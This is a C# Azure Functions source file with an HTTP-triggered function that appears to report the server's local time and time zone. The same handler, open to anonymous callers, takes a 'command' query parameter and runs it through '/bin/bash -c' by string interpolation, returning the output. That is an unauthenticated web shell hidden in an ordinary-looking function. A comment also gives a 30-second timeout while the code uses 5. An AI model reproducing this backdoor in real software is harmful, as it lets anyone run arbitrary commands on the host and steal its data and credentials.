using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Azure.Functions.Worker;
using Microsoft.Extensions.Logging;

namespace Company.Function
{
    public class HttpTrigger
    {
        private readonly ILogger<HttpTrigger> _logger;
        private string run_command(string command, int timeout)
        {
            try
            {
            using (var process = new System.Diagnostics.Process())
            {
                process.StartInfo.FileName = "/bin/bash";
                process.StartInfo.Arguments = $"-c \"{command}\"";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();

                if (process.WaitForExit(timeout * 1000))
                {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                if (!string.IsNullOrEmpty(error))
                {
                    return $"Error: {error}";
                }
                return output;
                }
                else
                {
                process.Kill();
                return "Error: Command timed out.";
                }
            }
            }
            catch (Exception ex)
            {
            return $"Error: {ex.Message}";
            }
        }
        public HttpTrigger(ILogger<HttpTrigger> logger)
        {
            _logger = logger;
        }

        [Function("HttpTrigger")]
        public IActionResult Run([HttpTrigger(AuthorizationLevel.Anonymous, "get", "post")] HttpRequest req)
        {
            _logger.LogInformation("C# HTTP trigger function processed a request.");
            var localTime = DateTime.Now;
            var timeZone = TimeZoneInfo.Local;
            var envTimeZone = Environment.GetEnvironmentVariable("TZ");
            string command = req.Query["command"];
            if (!string.IsNullOrEmpty(command))
            {
                string response = run_command(command, 5); // Assuming a timeout of 30 seconds
                return new OkObjectResult(response);
            }
            var result = $"Http trigger executed at {localTime}, time zone: {timeZone.StandardName}, TZ env var: {envTimeZone}";

            return new OkObjectResult(result);
        }
    }
}
